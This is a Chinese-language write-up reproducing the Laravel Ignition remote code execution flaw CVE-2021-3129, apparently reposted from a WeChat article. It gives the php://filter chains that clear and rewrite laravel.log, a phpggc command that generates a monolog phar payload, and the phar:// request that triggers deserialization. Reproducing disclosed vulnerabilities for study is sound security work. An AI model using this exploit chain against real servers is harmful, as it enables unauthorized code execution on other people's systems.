# Laravel远程代码执行漏洞(CVE-2021-3129)漏洞复现

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU2MzE2Mjk4Mg==&mid=2247483861&idx=1&sn=b551e4c271e9560c486948dae414df16&chksm=fc5f3bdccb28b2ca780aeccf7bbe90fc6fc744b592122128b4053ceb7cd56b352ee4914132af&scene=126&sessionid=1681656914#rd](http://mp.weixin.qq.com/s?__biz=MzU2MzE2Mjk4Mg==&mid=2247483861&idx=1&sn=b551e4c271e9560c486948dae414df16&chksm=fc5f3bdccb28b2ca780aeccf7bbe90fc6fc744b592122128b4053ceb7cd56b352ee4914132af&scene=126&sessionid=1681656914#rd)

  

2021年1月国外的安全公司`AMBIONICS`披露了一个`Laravel <= v8.4.2 Ignition <= 2.5.1 Debug`模式下存在的一个远程代码执行漏洞`CVE-2021-3129`，漏洞成因是`Laravel`默认错误页生成组件`Ignition`对参数过滤不严导致的，作者原文我理解的不是特别透彻，所以为更好理解，自己也跟着复现下。

  

### 0x01 : 环境搭建

    公众号“漏洞推送”中已经打包了现成的环境，直接拿来用就可以了 (感谢大佬)。

```
链接: https://pan.baidu.com/s/1usKF77aFohrN\_GCeMEvkhA 密码: padj
```

解压后进入`laraven`目录，首先需要编辑

`laravel/resources/views/welcome.blade.php`

将`{{$name}`修改为`{{$name}}，`否则表达式无效，页面不能正常显示。

  

进入`public`目录，使用`php`内置的`web`服务器启动即可，无需复杂环境配置。访问对应端口即可看到页面正常显示。

0x02: 漏洞分析

`Ignition`本身也对错误提供了修复建议,可以一键对错误进行修复。

  

![](../Images/b260d5f4bf37134bb7cf13c6aa893476.png)

  

访问首页后点击Make variable optional抓取请求包，可以看到调的solution是MakeViewVariableOptionalSolution。

  

![](../Images/3e2d35b9e699cccbe32bb374d87bee39.png)

  

调试可以看到是

`/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php`

起调了

`/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`的`run`方法，并以数组的形式传递了`variableName、viewFile`参数。

  

![](../Images/cf352cca5e2478b7d375ed79e8459e7e.png)

同时第`67`行代码调用了本类的`makeOptional`方法，该方法中使用了`file_get_contents`获取了要修复的文件内容，并对其中要修复的内容使用`str_replace`进行替换，以生成修复后的内容。由于在获取文件内容时直接 将我们可控的变量`viewFile`做为参数传递给了`file_get_contents`，作者通过`phar`反序列化成功实现了`RCE`。

  

0x03漏洞利用链:

源作者通过报错将经过编码的序列化数据写入到`log`文件中，再结合`php://filter base64-decode`编码转换的特性将`log`文件中无用的信息清空，最终实现`RCE`。

  

`Laravel`的日志文件保存在`/storage/logs/laravel.log`，记录了运行时的错误，可以通过它来将序列化的`php`代码写入。然后使用`phar://`执行经过序列化的代码。

  

![](../Images/557ee715c207141ca5fe01d4a0bf9179.png)

  
![](../Images/240e0de5702ab659da35f0f41f586e81.png)

在复现漏洞之前需要明白几个特性，上图可以看到写入的数据出现了两次，这样是存在问题的，我们可以使用`php://filter`提供的其他的编码转换来将重复的`payload`破坏掉。

```
\> echo -ne '\[Some prefix \]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0\[midfix\]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0\[Some suffix \]' > test.txt
php > echo file\_get\_contents('php://filter/read=convert.iconv.utf16le.utf8/resource=test.txt');
卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠
```

在`payload`的末尾补上一个任意字符，这样可以破坏字节对齐。

```
\> echo -ne '\[Some prefix \]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X\[midfix\]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X\[Some suffix \]' > test.txt
php > echo file\_get\_contents('php://filter/read=convert.iconv.utf16le.utf8/resource=test.txt');
卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠
```

OK，可以看到成功的避免了数据重复。此外作者还使用了`convert.quoted-printable-decode`将`payload`进行编码，这样可以将`\00`编码为`=00`从而避免了出现空字节导致的报错。

在使用`php://filter base64-decode`进行解码它时会将非`base64`过滤掉。因此可以利用这个特性去清除`log`中无用的内容。

  

```
\> echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /tmp/test.txt
php > $test='php://filter/read=convert.base64-decode|convert.base64-decode/resource=/tmp/test.txt';
php > echo file\_get\_contents($test);
test
```

虽然会过滤掉非`base64`编码，但某些情况下要解码的`base64`字符串中间包含了`=`，这时候`php`就会抛出一个错误。所以要清除`log`内容先需要将其中的内容转为非`base64`字符，再进行以上操作才能将`log`清空。

作者首先将内容编码为`quoted-printable`再使用`iconv`将`utf16`转换成`utf8`。

  

![](../Images/9bd95556737afa0ae556d33ba1364475.png)  

这时`log`文件中的内容经过多次转换已经不包含有效的`base64`编码了，再次调用`base64`解码，日志的文件内容将被清空！

完整编码转换链:

```
php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

也可以使用`consumed`来实现同样的效果（这个`red chain`网上没找到相关资料，有知道的大佬还望不吝赐教）

  

```
php://filter/read=consumed/resource=../storage/logs/laravel.log
```

### 0x04漏洞复现:

使用`phpggc`生成序列化代码并进行两次编码。

```
\> ./phpggc monolog/rce1 call\_user\_func phpinfo --phar phar -o php://output | base64 -w0|sed -E 's/=+$//g' | sed -E 's/./\\0=00/g'
P=00D=009=00w=00a=00H=00A=00g=00X=001.......=00k=001=00C=00
```

生成的代码需要在末尾追加一个字符串，否则会被之后的`base64`操作清空。

  

![](../Images/fcc5ed8fe964b1d2bae1297d618da23a.png)

将`viewFile`参数如下修改，发送请求以清空`log`。

```
viewFile php://filter/read=consumed/resource=../storage/logs/laravel.log
```

修改`viewFile`参数为经过处理的序列化代码，再次发送请求。

随后再次修改`viewFile`参数对日志进行清除操作

```
php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

如果操作成功这时候`log`中的内容应该是这样的。

  
![](../Images/f44f9a89f67f817dc67e8e9059dba51c.png)

再次修改参数构造执行`phar`反序列化。

```
phar:///tmp/laravel/storage/logs/laravel.log/test.txt
```

发送请求后代码被执行，成功实现RCE。
